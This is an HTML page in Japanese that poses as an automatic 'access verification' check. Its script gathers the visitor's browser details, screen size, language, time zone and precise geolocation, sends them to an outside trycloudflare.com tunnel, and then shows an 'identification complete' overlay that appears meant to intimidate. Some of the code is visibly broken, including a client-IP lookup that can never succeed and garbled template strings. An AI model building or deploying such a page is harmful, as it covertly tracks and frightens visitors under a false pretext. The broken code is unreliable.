<!doctype html>
<html lang="ja">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>検証中</title>

<style>
*{box-sizing:border-box}
body{
  margin:0;height:100vh;display:grid;place-items:center;
  background:#0b0b0b;color:#e6e6e6;font-family:system-ui;overflow:hidden
}
.card{
  width:min(92vw,520px);padding:28px 26px 26px;border-radius:18px;
  background:linear-gradient(180deg,#111,#0a0a0a);
  box-shadow:0 20px 60px rgba(0,0,0,.7),
             inset 0 0 0 1px rgba(255,255,255,.04)
}
h1{margin:0 0 10px;font-size:1.2rem;letter-spacing:.08em;color:#9ef}
.muted{opacity:.65;font-size:.9rem}
.bar{height:10px;border-radius:999px;background:#111;overflow:hidden;margin:16px 0}
.bar>i{display:block;height:100%;width:0;
  background:linear-gradient(90deg,#6cf,#f6f);transition:width .25s}
.overlay{
  position:fixed;inset:0;display:grid;place-items:center;
  background:rgba(0,0,0,.88);opacity:0;pointer-events:none;
  transition:opacity .4s
}
.overlay.show{opacity:1;pointer-events:auto}
.big{font-size:clamp(1.8rem,6vw,3rem);letter-spacing:.2em}
.muted.small{font-size:.9rem;opacity:.75}
</style>
</head>

<body>

<div class="card">
  <h1>アクセス検証</h1>
  <div class="muted">自動チェックを実行しています。しばらくお待ちください。</div>
  <div class="bar"><i id="prog"></i></div>
</div>

<div id="ov" class="overlay">
  <div style="text-align:center;max-width:90vw">
    <div class="big">特 定 完 了</div>
    <div style="text-align:left;background:#000;border-radius:14px;
      padding:16px;box-shadow:inset 0 0 0 1px rgba(255,255,255,.08);margin-top:12px">
      <div class="muted small" style="margin-bottom:6px">取得情報（自動）</div>
      <ul id="infoList" style="list-style:none;padding:0;margin:0;line-height:1.7">
        <li>IPアドレス: <b id="ip">取得中…</b></li>
        <li>位置情報: <b id="geo">取得中…</b></li>
        <li>ログID: <b id="logid">—</b></li>
        <li>端末: <b id="ua">—</b></li>
        <li>OS推定: <b id="os">—</b></li>
        <li>画面: <b id="scr">—</b></li>
        <li>言語: <b id="lang">—</b></li>
        <li>タイムゾーン: <b id="tz">—</b></li>
        <li>滞在時間: <b id="stay">—</b></li>
        <li>信頼スコア: <b id="score">—</b></li>
      </ul>
    </div>
  </div>
</div>

<script>
const API = 'https://shareware-afford-accessories-shade.trycloudflare.com';
let LOG_ID = null;

const prog = document.getElementById('prog');
const ov = document.getElementById('ov');

const ipEl    = document.getElementById('ip');
const geoEl   = document.getElementById('geo');
const logid   = document.getElementById('logid');
const ua      = document.getElementById('ua');
const os      = document.getElementById('os');
const scr     = document.getElementById('scr');
const lang    = document.getElementById('lang');
const tz      = document.getElementById('tz');
const stay    = document.getElementById('stay');
const score   = document.getElementById('score');

let percent = 0;
let startTime = Date.now();
let completed = false;

function updateStay() {
  const sec = Math.floor((Date.now() - startTime)/1000);
  stay.textContent = sec + "秒";
}
setInterval(updateStay, 500);

function advance(target){
  const interval = setInterval(()=>{
    percent += Math.random()*4;
    if(percent >= target){
      percent = target;
      clearInterval(interval);
    }
    prog.style.width = percent + "%";
  },120);
}

function finish(){
  if(completed) return;
  completed = true;
  advance(100);
  setTimeout(()=>{
    ov.classList.add('show');
  },600);
}

function getClientIP() {
  // Cloudflare系プロキシがよく使うヘッダー順
  const headers = [
    'CF-Connecting-IP',
    'True-Client-IP',
    'X-Real-IP',
    'X-Forwarded-For'
  ];

  for (const h of headers) {
    const value = headers[h.toLowerCase()];
    if (value) {
      // X-Forwarded-Forの場合は最初のカンマ区切りが本来のクライアントIPであることが多い
      if (h === 'X-Forwarded-For') {
        return value.split(',')[0].trim();
      }
      return value;
    }
  }

  // 最終手段（ほぼ取れないが一応）
  return '取得失敗';
}

// メイン処理
(() => {
  const payload = {
    ua: navigator.userAgent,
    os: (/(Windows|Mac|Linux|Android|iPhone|iPad)/.exec(navigator.userAgent)||['Unknown'])[0],
    screen: `\( {screen.width}× \){screen.height}`,
    lang: navigator.language,
    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
    score: 80 - Math.floor(Math.random()*20),
    geo: '取得中…',
    ip: '取得中…'
  };

  // IPを先にクライアント側で推測表示（参考値）
  const clientIP = getClientIP();
  ipEl.textContent = clientIP;
  payload.ip = clientIP;

  ua.textContent = payload.ua;
  os.textContent = payload.os;
  scr.textContent = payload.screen;
  lang.textContent = payload.lang;
  tz.textContent = payload.tz;
  score.textContent = payload.score;

  advance(30);

  fetch(`${API}/log`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload)
  })
  .then(r => r.json())
  .then(j => {
    LOG_ID = j.id;
    logid.textContent = LOG_ID;
    advance(60);

    // サーバー側で確定したIPを上書き表示したい場合はここで再度取得も可能
    // ただし多くの場合CF-Connecting-IPが正しいので省略可
  })
  .catch(() => {
    advance(60);
  });

  // 位置情報
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      pos => {
        const g = `\( {pos.coords.latitude.toFixed(5)}, \){pos.coords.longitude.toFixed(5)}`;
        geoEl.textContent = g;
        payload.geo = g;
        advance(85);

        // 位置情報更新
        fetch(`${API}/log/geo`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ id: LOG_ID, geo: g, ip: clientIP })
        }).finally(finish);
      },
      () => {
        geoEl.textContent = '拒否 / 不可';
        advance(85);
        setTimeout(finish, 800);
      },
      { timeout: 1500, enableHighAccuracy: false }
    );
  } else {
    geoEl.textContent = '非対応';
    advance(85);
    setTimeout(finish, 1200);
  }
})();
</script>
</body>
</html>
